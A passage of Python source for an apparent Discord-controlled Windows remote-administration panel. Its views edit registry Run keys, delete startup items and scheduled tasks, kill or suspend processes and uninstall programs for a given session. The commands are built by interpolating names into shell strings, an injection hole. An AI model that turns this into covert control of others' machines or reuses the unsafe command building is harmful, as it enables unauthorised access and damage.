        detail_embed.set_footer(text=f"Path: {self.current_path}")
        
        view = ValueActionView(self.current_path, self.session_id, found['name'], found['type'], found['data'], self.page)
        await interaction.response.send_message(embed=detail_embed, view=view)


class ValueActionView(discord.ui.View):
    """Edit/Delete buttons shown after selecting a specific value."""
    def __init__(self, reg_path: str, session_id: str, val_name: str, val_type: str, val_data: str, page: int = 0):
        super().__init__(timeout=120)
        self.reg_path = reg_path
        self.session_id = session_id
        self.val_name = val_name
        self.val_type = val_type
        self.val_data = val_data
        self.page = page
    
    @discord.ui.button(label="Edit Value", emoji="✏️", style=discord.ButtonStyle.primary)
    async def edit_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        modal = EditValueModal(
            self.reg_path, self.session_id,
            prefill_name=self.val_name,
            prefill_type=self.val_type,
            prefill_data=self.val_data,
            page=self.page
        )
        await interaction.response.send_modal(modal)
    
    @discord.ui.button(label="Delete Value", emoji="🗑️", style=discord.ButtonStyle.danger)
    async def delete_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        success, msg = RegistryEditor.delete_value(self.reg_path, self.val_name)
        status = "✅ Value deleted!" if success else f"❌ Error: {msg}"
        result_embed = discord.Embed(
            title="🗑️ Delete Result",
            description=status,
            color=discord.Color.green() if success else discord.Color.red()
        )
        await interaction.response.edit_message(embed=result_embed, view=None)


class RegistryView(discord.ui.View):
    """Full interactive registry editor view with pagination and value selection."""
    def __init__(self, current_path: str = "", session_id: str = "", page: int = 0):
        super().__init__(timeout=300)
        self.current_path = current_path
        self.session_id = session_id
        self.page = page
        
        # Row 0: subkey navigation
        self.add_item(RegistryNavSelect(current_path, session_id, page))
        
        # Row 1: values dropdown (only when values exist)
        if current_path:
            vals = RegistryEditor.get_values(current_path)
            if vals:
                self.add_item(RegistryValSelect(current_path, session_id, page))
    
    @discord.ui.button(label="⬆ Back", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.current_path or "\\" not in self.current_path:
            new_path = ""
        else:
            new_path = "\\".join(self.current_path.split("\\")[:-1])
        embed = build_registry_embed(new_path, self.session_id)
        view = RegistryView(new_path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="◀", style=discord.ButtonStyle.secondary, row=2)
    async def prev_page_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = max(0, self.page - 1)
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=new_page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="▶", style=discord.ButtonStyle.secondary, row=2)
    async def next_page_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.current_path:
            total = len(RegistryEditor.get_subkeys(self.current_path))
            max_page = max(0, (total - 1) // 24)
        else:
            max_page = 0
        new_page = min(max_page, self.page + 1)
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=new_page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=2)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        embed = build_registry_embed(self.current_path, self.session_id)
        view = RegistryView(self.current_path, self.session_id, page=self.page)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="New Value", emoji="📝", style=discord.ButtonStyle.primary, row=3)
    async def newvalue_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if not self.current_path:
            await interaction.response.send_message("❌ Select a key first!", ephemeral=True)
            return
        await interaction.response.send_modal(NewValueModal(self.current_path, self.session_id, self.page))
    
    @discord.ui.button(label="HKCU Run", emoji="👤", style=discord.ButtonStyle.secondary, row=3)
    async def hkcu_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        path = r"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
        embed = build_registry_embed(path, self.session_id)
        view = RegistryView(path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="HKLM Run", emoji="💻", style=discord.ButtonStyle.secondary, row=3)
    async def hklm_run_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        path = r"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
        embed = build_registry_embed(path, self.session_id)
        view = RegistryView(path, self.session_id, page=0)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=4)
    async def back_tools_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Interactive Startup Manager UI
# ========================================

class StartupManager:
    """Helper class to gather startup items from 3 sources."""
    
    # Startup folder paths
    USER_STARTUP = os.path.join(os.environ.get('APPDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
    COMMON_STARTUP = os.path.join(os.environ.get('PROGRAMDATA', ''), r'Microsoft\Windows\Start Menu\Programs\Startup')
    
    # Registry Run keys
    REG_KEYS = [
        r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run',
        r'HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce',
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
        r'HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
    ]
    
    @staticmethod
    def get_startup_files():
        """Get items from Startup folders."""
        items = []
        for folder in [StartupManager.USER_STARTUP, StartupManager.COMMON_STARTUP]:
            try:
                if os.path.isdir(folder):
                    for f in os.listdir(folder):
                        full_path = os.path.join(folder, f)
                        items.append({
                            'name': f,
                            'type': 'File',
                            'path': folder,
                            'full_path': full_path,
                            'source': 'file',
                            'icon': '📄'
                        })
            except Exception:
                pass
        return items
    
    @staticmethod
    def get_registry_entries():
        """Get startup entries from Registry Run keys."""
        items = []
        for key_path in StartupManager.REG_KEYS:
            try:
                result = subprocess.run(
                    f'reg query "{key_path}"',
                    shell=True, capture_output=True, text=True,
                    timeout=10, encoding='utf-8', errors='replace'
                )
                for line in result.stdout.strip().split('\n'):
                    line = line.strip()
                    if not line or line.startswith('HKEY') or line.startswith('End'):
                        continue
                    parts = line.split(None, 2)
                    if len(parts) >= 3:
                        items.append({
                            'name': parts[0],
                            'type': 'Registry',
                            'path': key_path,
                            'full_path': parts[2],
                            'source': 'registry',
                            'reg_key': key_path,
                            'reg_name': parts[0],
                            'icon': '🔑'
                        })
            except Exception:
                pass
        return items
    
    @staticmethod
    def get_scheduled_tasks():
        """Get startup-related scheduled tasks."""
        items = []
        try:
            # Get tasks that trigger on Boot or Logon
            cmd = "powershell \"Get-ScheduledTask | Where-Object { $_.Triggers.CimClass.CimClassName -match 'BootTrigger|LogonTrigger' } | Select-Object TaskPath, TaskName | Format-Table -HideTableHeaders\""
            result = subprocess.run(
                cmd,
                shell=True, capture_output=True, text=True,
                timeout=15, encoding='utf-8', errors='replace'
            )
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line:
                    continue
                # Output format: \Microsoft\Windows\AppID\    VerifiedPublisherCertStoreCheck
                # Split by space, first part is path, rest is name
                parts = line.split(None, 1)
                if len(parts) >= 2:
                    task_path = parts[0].strip()
                    task_name = parts[1].strip()
                    full_task_name = f"{task_path}{task_name}" if task_path.endswith('\\') else f"{task_path}\\{task_name}"
                    
                    items.append({
                        'name': task_name,
                        'type': 'Task',
                        'path': task_path,
                        'full_path': full_task_name,
                        'source': 'task',
                        'task_name': full_task_name,
                        'icon': '⏰'
                    })
        except Exception:
            pass
        return items
    
    @staticmethod
    def get_all_items():
        """Gather startup items from all 3 sources."""
        items = []
        items.extend(StartupManager.get_startup_files())
        items.extend(StartupManager.get_registry_entries())
        items.extend(StartupManager.get_scheduled_tasks())
        return items
    
    @staticmethod
    def remove_item(item: dict):
        """Remove a startup item based on its source."""
        try:
            if item['source'] == 'file':
                path = item['full_path']
                if os.path.isfile(path):
                    os.remove(path)
                    return True, f"File deleted: {item['name']}"
                elif os.path.isdir(path):
                    import shutil
                    shutil.rmtree(path)
                    return True, f"Folder deleted: {item['name']}"
                else:
                    return False, "File not found."
            
            elif item['source'] == 'registry':
                result = subprocess.run(
                    f'reg delete "{item["reg_key"]}" /v "{item["reg_name"]}" /f',
                    shell=True, capture_output=True, text=True,
                    timeout=10, encoding='utf-8', errors='replace'
                )
                if result.returncode == 0:
                    return True, f"Registry value deleted: {item['name']}"
                return False, result.stderr.strip() or "Failed to delete registry value."
            
            elif item['source'] == 'task':
                result = subprocess.run(
                    f'schtasks /delete /tn "{item["task_name"]}" /f',
                    shell=True, capture_output=True, text=True,
                    timeout=10, encoding='utf-8', errors='replace'
                )
                if result.returncode == 0:
                    return True, f"Task deleted: {item['name']}"
                return False, result.stderr.strip() or "Failed to delete task."
            
            return False, "Unknown source type."
        except Exception as e:
            return False, str(e)


def build_startup_embed(session_id: str, items: list = None, selected_idx: int = -1):
    """Build the Startup Manager embed with table-style layout."""
    if items is None:
        items = StartupManager.get_all_items()
    
    # Build table header
    header = f"{'[ Name ]':<38} {'[ Type ]':<10} {'[ Path ]'}"
    sep = "━" * 72
    
    rows = ""
    for i, item in enumerate(items):
        name = item['name']
        if len(name) > 34:
            name = name[:31] + "..."
        
        path_display = item['path']
        if len(path_display) > 38:
            path_display = path_display[:35] + "..."
        
        marker = "►" if i == selected_idx else " "
        icon = item['icon']
        item_type = item['type']
        
        rows += f"{marker} {icon} {name:<34} {item_type:<8} {path_display}\n"
    
    if not items:
        rows = "  (No startup items found)\n"
    
    table_block = f"```\n{header}\n{sep}\n{rows}```"
    
    if len(table_block) > 4000:
        table_block = table_block[:3990] + "\n...```"
    
    selected_count = 1 if selected_idx >= 0 else 0
    
    embed = discord.Embed(
        title=f"🚀 Startup Manager : {session_id}",
        description=table_block,
        color=discord.Color.from_rgb(0, 120, 215)
    )
    embed.set_footer(text=f"Selected [{selected_count}]  Startup [{len(items)}]")
    
    return embed, items


class StartupSelect(discord.ui.Select):
    """Dropdown to select a startup item from the list."""
    def __init__(self, items: list, session_id: str):
        self.session_id = session_id
        self.items_data = items
        
        if items:
            options = []
            for i, item in enumerate(items[:25]):  # Discord max 25 options
                label = item['name'][:100] if len(item['name']) > 100 else item['name']
                desc = f"{item['type']} — {item['path']}"
                options.append(discord.SelectOption(
                    label=label,
                    description=desc[:100],
                    value=str(i),
                    emoji=item['icon']
                ))
        else:
            options = [discord.SelectOption(label="(no items)", value="_none")]
        
        super().__init__(placeholder="🚀 Select a startup item...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        idx = int(selected)
        embed, items = build_startup_embed(self.session_id, self.items_data, selected_idx=idx)
        view = StartupManagerView(self.session_id, self.items_data, selected_idx=idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class StartupManagerView(discord.ui.View):
    """Interactive view for Startup Manager with Remove, Refresh, and Back."""
    def __init__(self, session_id: str, items: list = None, selected_idx: int = -1):
        super().__init__(timeout=300)
        self.session_id = session_id
        self.selected_idx = selected_idx
        self.items_data = items if items is not None else StartupManager.get_all_items()
        
        # Add select dropdown
        self.add_item(StartupSelect(self.items_data, session_id))
    
    @discord.ui.button(label="Remove", emoji="🗑️", style=discord.ButtonStyle.danger, row=1)
    async def remove_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        if self.selected_idx < 0 or self.selected_idx >= len(self.items_data):
            await interaction.response.send_message("❌ Please select a startup item first!", ephemeral=True)
            return
        
        target = self.items_data[self.selected_idx]
        success, msg = StartupManager.remove_item(target)
        
        # After removing, refresh the list
        new_items = StartupManager.get_all_items()
        embed, items = build_startup_embed(self.session_id, new_items)
        
        if success:
            embed.add_field(name="✅ Removed", value=f"`{target['name']}` ({target['type']})", inline=False)
        else:
            embed.add_field(name="❌ Failed", value=f"`{target['name']}` — {msg}", inline=False)
        
        view = StartupManagerView(self.session_id, new_items)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="🔄", style=discord.ButtonStyle.success, row=1)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_items = StartupManager.get_all_items()
        embed, items = build_startup_embed(self.session_id, new_items)
        view = StartupManagerView(self.session_id, new_items)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="⬅", style=discord.ButtonStyle.secondary, row=1)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Interactive Process Manager UI
# ========================================

class ProcessManager:
    """Helper class to get process data and manage processes."""
    
    @staticmethod
    def get_processes():
        """Get list of running processes with Name, PID, Description."""
        try:
            cmd = 'powershell "Get-Process | Select-Object ProcessName, Id, Description | Sort-Object ProcessName | Format-Table -HideTableHeaders"'
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=15, encoding='utf-8', errors='replace'
            )
            processes = []
            seen = set()
            for line in result.stdout.strip().split('\n'):
                line = line.strip()
                if not line:
                    continue
                parts = line.split(None, 2)
                if len(parts) >= 2:
                    name = parts[0].strip()
                    try:
                        pid = int(parts[1].strip())
                    except ValueError:
                        continue
                    desc = parts[2].strip() if len(parts) >= 3 else ""
                    key = f"{name}_{pid}"
                    if key not in seen:
                        seen.add(key)
                        processes.append({
                            'name': f"{name}.exe",
                            'pid': pid,
                            'description': desc if desc else name,
                        })
            return processes
        except Exception:
            return []
    
    @staticmethod
    def close_process(pid: int):
        """Kill a process by PID."""
        try:
            result = subprocess.run(
                f'taskkill /F /PID {pid}',
                shell=True, capture_output=True, text=True,
                timeout=10, encoding='utf-8', errors='replace'
            )
            if result.returncode == 0:
                return True, "Process terminated."
            return False, result.stderr.strip() or "Failed to terminate."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def restart_process(pid: int, name: str):
        """Kill and restart a process."""
        try:
            # First get the executable path
            cmd = f'powershell "(Get-Process -Id {pid}).Path"'
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=10, encoding='utf-8', errors='replace'
            )
            exe_path = result.stdout.strip()
            
            if not exe_path or not os.path.exists(exe_path):
                return False, "Could not find executable path."
            
            # Kill the process
            subprocess.run(f'taskkill /F /PID {pid}', shell=True, timeout=10)
            
            # Start it again
            subprocess.Popen(exe_path, shell=True)
            return True, f"Process restarted: {name}"
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def suspend_process(pid: int):
        """Suspend a process using PowerShell."""
        try:
            cmd = f'powershell "(Get-Process -Id {pid}).Suspend()"'
            # Use pssuspend alternative via debug API
            cmd = f'powershell "$proc = Get-Process -Id {pid}; $proc.Suspend()"'
            result = subprocess.run(
                cmd, shell=True, capture_output=True, text=True,
                timeout=10, encoding='utf-8', errors='replace'
            )
            # Suspend via NtSuspendProcess
            import ctypes
            PROCESS_SUSPEND_RESUME = 0x0800
            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
            if handle:
                ntdll = ctypes.windll.ntdll
                ntdll.NtSuspendProcess(handle)
                ctypes.windll.kernel32.CloseHandle(handle)
                return True, "Process suspended."
            return False, "Could not open process."
        except Exception as e:
            return False, str(e)
    
    @staticmethod
    def resume_process(pid: int):
        """Resume a suspended process."""
        try:
            import ctypes
            PROCESS_SUSPEND_RESUME = 0x0800
            handle = ctypes.windll.kernel32.OpenProcess(PROCESS_SUSPEND_RESUME, False, pid)
            if handle:
                ntdll = ctypes.windll.ntdll
                ntdll.NtResumeProcess(handle)
                ctypes.windll.kernel32.CloseHandle(handle)
                return True, "Process resumed."
            return False, "Could not open process."
        except Exception as e:
            return False, str(e)


def build_process_embed(session_id: str, page: int = 0, processes: list = None, selected_idx: int = -1):
    """Build the Process Manager embed with table-style layout and pagination."""
    if processes is None:
        processes = ProcessManager.get_processes()
        
    per_page = 20
    total = len(processes)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start = page * per_page
    end = min(start + per_page, total)
    page_procs = processes[start:end]
    
    # Build table header
    header = f"{'[ Name ]':<28} {'[ PID ]':<8} {'[ Description ]'}"
    sep = "\u2501" * 64
    
    rows = ""
    for i, proc in enumerate(page_procs):
        name = proc['name']
        if len(name) > 24:
            name = name[:21] + "..."
        
        desc = proc['description']
        if len(desc) > 24:
            desc = desc[:21] + "..."
        
        overall_idx = start + i
        marker = "\u25ba" if overall_idx == selected_idx else " "
        pid_str = str(proc['pid'])
        
        rows += f"{marker} {name:<26} {pid_str:<6} {desc}\n"
    
    if not processes:
        rows = "  (No processes found)\n"
    
    table_block = f"```\n{header}\n{sep}\n{rows}```"
    
    if len(table_block) > 4000:
        table_block = table_block[:3990] + "\n...```"
    
    selected_count = 1 if selected_idx >= 0 else 0
    
    embed = discord.Embed(
        title=f"\ud83d\udcca Process Manager : {session_id}",
        description=table_block,
        color=discord.Color.from_rgb(0, 120, 215)
    )
    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Process [{total}]")
    
    return embed, processes, page, total_pages


class ProcessSelect(discord.ui.Select):
    """Dropdown to select a process from the current page."""
    def __init__(self, session_id: str, page: int, processes: list):
        self.session_id = session_id
        self.page = page
        self.processes_data = processes
        
        per_page = 20
        start = page * per_page
        end = min(start + per_page, len(processes))
        page_procs = processes[start:end]
        
        if page_procs:
            options = []
            for i, proc in enumerate(page_procs):
                overall_idx = start + i
                label = f"{proc['name']} (PID: {proc['pid']})"
                label = label[:100]
                options.append(discord.SelectOption(
                    label=label,
                    description=proc['description'][:100] if proc['description'] else "No description",
                    value=str(overall_idx),
                    emoji="\ud83d\udcca"
                ))
        else:
            options = [discord.SelectOption(label="(no processes)", value="_none")]
        
        super().__init__(placeholder="\ud83d\udcca Select a process...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        idx = int(selected)
        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=idx)
        view = ProcessManagerView(self.session_id, pg, self.processes_data, selected_idx=idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class ProcessManagerView(discord.ui.View):
    """Interactive view for Process Manager with Refresh, Close, Restart, Suspend, Resume."""
    def __init__(self, session_id: str, page: int = 0, processes: list = None, selected_idx: int = -1):
        super().__init__(timeout=300)
        self.session_id = session_id
        self.page = page
        self.selected_idx = selected_idx
        self.processes_data = processes if processes is not None else ProcessManager.get_processes()
        self.total_pages = max(1, (len(self.processes_data) + 19) // 20)
        
        # Add select dropdown
        self.add_item(ProcessSelect(session_id, page, self.processes_data))
    
    def _get_selected(self):
        """Get the selected process or None."""
        if self.selected_idx < 0 or self.selected_idx >= len(self.processes_data):
            return None
        return self.processes_data[self.selected_idx]
    
    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = max(0, self.page - 1)
        embed, procs, pg, tp = build_process_embed(self.session_id, new_page, self.processes_data)
        view = ProcessManagerView(self.session_id, pg, self.processes_data)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = min(self.total_pages - 1, self.page + 1)
        embed, procs, pg, tp = build_process_embed(self.session_id, new_page, self.processes_data)
        view = ProcessManagerView(self.session_id, pg, self.processes_data)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
    async def refresh_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_procs = ProcessManager.get_processes()
        embed, procs, pg, tp = build_process_embed(self.session_id, 0, new_procs)
        view = ProcessManagerView(self.session_id, 0, new_procs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Close", emoji="\ud83d\udeab", style=discord.ButtonStyle.danger, row=1)
    async def close_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        target = self._get_selected()
        if not target:
            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
            return
        
        success, msg = ProcessManager.close_process(target['pid'])
        new_procs = ProcessManager.get_processes()
        
        per_page = 20
        total = len(new_procs)
        total_pages = max(1, (total + per_page - 1) // per_page)
        page = max(0, min(self.page, total_pages - 1))
        
        embed, procs, pg, tp = build_process_embed(self.session_id, page, new_procs)
        
        if success:
            embed.add_field(name="\u2705 Closed", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
        
        view = ProcessManagerView(self.session_id, pg, new_procs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Restart", emoji="\ud83d\udd04", style=discord.ButtonStyle.primary, row=2)
    async def restart_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        target = self._get_selected()
        if not target:
            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
            return
        
        success, msg = ProcessManager.restart_process(target['pid'], target['name'])
        new_procs = ProcessManager.get_processes()
        
        per_page = 20
        total = len(new_procs)
        total_pages = max(1, (total + per_page - 1) // per_page)
        page = max(0, min(self.page, total_pages - 1))
        
        embed, procs, pg, tp = build_process_embed(self.session_id, page, new_procs)
        
        if success:
            embed.add_field(name="\u2705 Restarted", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
        
        view = ProcessManagerView(self.session_id, pg, new_procs)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Suspend", emoji="\u23f8", style=discord.ButtonStyle.secondary, row=2)
    async def suspend_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        target = self._get_selected()
        if not target:
            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
            return
        
        success, msg = ProcessManager.suspend_process(target['pid'])
        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
        
        if success:
            embed.add_field(name="\u23f8 Suspended", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
        
        view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Resume", emoji="\u25b6", style=discord.ButtonStyle.secondary, row=2)
    async def resume_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        target = self._get_selected()
        if not target:
            await interaction.response.send_message("\u274c Please select a process first!", ephemeral=True)
            return
        
        success, msg = ProcessManager.resume_process(target['pid'])
        embed, procs, pg, tp = build_process_embed(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
        
        if success:
            embed.add_field(name="\u25b6 Resumed", value=f"`{target['name']}` (PID: {target['pid']})", inline=False)
        else:
            embed.add_field(name="\u274c Failed", value=f"`{target['name']}` \u2014 {msg}", inline=False)
        
        view = ProcessManagerView(self.session_id, self.page, self.processes_data, selected_idx=self.selected_idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Back to Tools", emoji="\u2b05", style=discord.ButtonStyle.secondary, row=2)
    async def back_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        await interaction.response.edit_message(content=None, embed=embed_tools_panel(), view=ToolsPanelView())


# ========================================
# Interactive Installed Programs UI
# ========================================

class InstalledProgramsManager:
    """Helper class to get installed programs and uninstall them."""
    
    REG_PATHS = [
        r'HKLM\Software\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKLM\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall',
        r'HKCU\Software\Microsoft\Windows\CurrentVersion\Uninstall',
    ]
    
    @staticmethod
    def get_programs():
        """Get list of installed programs from registry."""
        programs = []
        seen = set()
        for reg_path in InstalledProgramsManager.REG_PATHS:
            try:
                cmd = f'powershell "Get-ItemProperty \'Registry::{reg_path}\\*\' -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -ne $null }} | Select-Object DisplayName, UninstallString | Sort-Object DisplayName | Format-Table -HideTableHeaders"'
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True,
                    timeout=15, encoding='utf-8', errors='replace'
                )
                for line in result.stdout.strip().split('\n'):
                    line = line.strip()
                    if not line:
                        continue
                    # Split into name and uninstall string
                    parts = line.split(None, 1)
                    if len(parts) >= 1:
                        # The name may contain spaces, so we need a smarter approach
                        # Use the full line as it may be just the name
                        name = line.strip()
                        if name and name not in seen:
                            seen.add(name)
                            programs.append({
                                'name': name,
                            })
            except Exception:
                pass
        
        # Sort alphabetically
        programs.sort(key=lambda p: p['name'].lower())
        return programs
    
    @staticmethod
    def uninstall_program(name: str):
        """Attempt to uninstall a program by finding its UninstallString."""
        try:
            for reg_path in InstalledProgramsManager.REG_PATHS:
                cmd = f"powershell \"Get-ItemProperty 'Registry::{reg_path}\\*' -ErrorAction SilentlyContinue | Where-Object {{ $_.DisplayName -eq '{name}' }} | Select-Object -ExpandProperty UninstallString\""
                result = subprocess.run(
                    cmd, shell=True, capture_output=True, text=True,
                    timeout=10, encoding='utf-8', errors='replace'
                )
                uninstall_str = result.stdout.strip()
                if uninstall_str:
                    # Execute uninstall command
                    subprocess.Popen(uninstall_str, shell=True)
                    return True, f"Uninstall started for: {name}"
            return False, "Uninstall string not found."
        except Exception as e:
            return False, str(e)


def build_programs_embed(session_id: str, page: int = 0, programs: list = None, selected_idx: int = -1):
    """Build the Installed Programs embed with table-style layout and pagination."""
    if programs is None:
        programs = InstalledProgramsManager.get_programs()
    
    per_page = 15
    total = len(programs)
    total_pages = max(1, (total + per_page - 1) // per_page)
    page = max(0, min(page, total_pages - 1))
    
    start = page * per_page
    end = min(start + per_page, total)
    page_progs = programs[start:end]
    
    # Build table header
    header = "[ Name ]"
    sep = "\u2501" * 54
    
    rows = ""
    for i, prog in enumerate(page_progs):
        overall_idx = start + i
        name = prog['name']
        if len(name) > 50:
            name = name[:47] + "..."
        
        marker = "\u25ba" if overall_idx == selected_idx else " "
        rows += f"{marker} \ud83d\udce6 {name}\n"
    
    if not programs:
        rows = "  (No programs found)\n"
    
    table_block = f"```\n{header}\n{sep}\n{rows}```"
    
    if len(table_block) > 4000:
        table_block = table_block[:3990] + "\n...```"
    
    selected_count = 1 if selected_idx >= 0 else 0
    
    embed = discord.Embed(
        title=f"\ud83d\udcbf Installed Programs : {session_id[:16]}...",
        description=table_block,
        color=discord.Color.from_rgb(0, 120, 215)
    )
    embed.set_footer(text=f"Page [{page+1}/{total_pages}]  Selected [{selected_count}]  Installed [{total}]")
    
    return embed, programs, page, total_pages


class ProgramsSelect(discord.ui.Select):
    """Dropdown to select a program from the current page."""
    def __init__(self, session_id: str, page: int, programs: list):
        self.session_id = session_id
        self.page = page
        self.programs_data = programs
        
        per_page = 15
        start = page * per_page
        end = min(start + per_page, len(programs))
        page_progs = programs[start:end]
        
        if page_progs:
            options = []
            for i, prog in enumerate(page_progs):
                overall_idx = start + i
                label = prog['name'][:100]
                options.append(discord.SelectOption(
                    label=label,
                    value=str(overall_idx),
                    emoji="\ud83d\udce6"
                ))
        else:
            options = [discord.SelectOption(label="(no programs)", value="_none")]
        
        super().__init__(placeholder="\ud83d\udcbf Select a program...", options=options, row=0)
    
    async def callback(self, interaction: discord.Interaction):
        selected = self.values[0]
        if selected == "_none":
            await interaction.response.defer()
            return
        
        idx = int(selected)
        embed, progs, pg, tp = build_programs_embed(self.session_id, self.page, self.programs_data, selected_idx=idx)
        view = InstalledProgramsView(self.session_id, pg, self.programs_data, selected_idx=idx)
        await interaction.response.edit_message(content=None, embed=embed, view=view)


class InstalledProgramsView(discord.ui.View):
    """Interactive view for Installed Programs with Refresh, Uninstall, pagination."""
    def __init__(self, session_id: str, page: int = 0, programs: list = None, selected_idx: int = -1):
        super().__init__(timeout=300)
        self.session_id = session_id
        self.page = page
        self.selected_idx = selected_idx
        self.programs_data = programs if programs is not None else InstalledProgramsManager.get_programs()
        self.total_pages = max(1, (len(self.programs_data) + 14) // 15)
        
        # Add select dropdown
        self.add_item(ProgramsSelect(session_id, page, self.programs_data))
    
    @discord.ui.button(label="\u25c0", style=discord.ButtonStyle.secondary, row=1)
    async def prev_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = max(0, self.page - 1)
        embed, progs, pg, tp = build_programs_embed(self.session_id, new_page, self.programs_data)
        view = InstalledProgramsView(self.session_id, pg, self.programs_data)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="\u25b6", style=discord.ButtonStyle.secondary, row=1)
    async def next_btn(self, interaction: discord.Interaction, button: discord.ui.Button):
        new_page = min(self.total_pages - 1, self.page + 1)
        embed, progs, pg, tp = build_programs_embed(self.session_id, new_page, self.programs_data)
        view = InstalledProgramsView(self.session_id, pg, self.programs_data)
        await interaction.response.edit_message(content=None, embed=embed, view=view)
    
    @discord.ui.button(label="Refresh", emoji="\ud83d\udd04", style=discord.ButtonStyle.success, row=1)
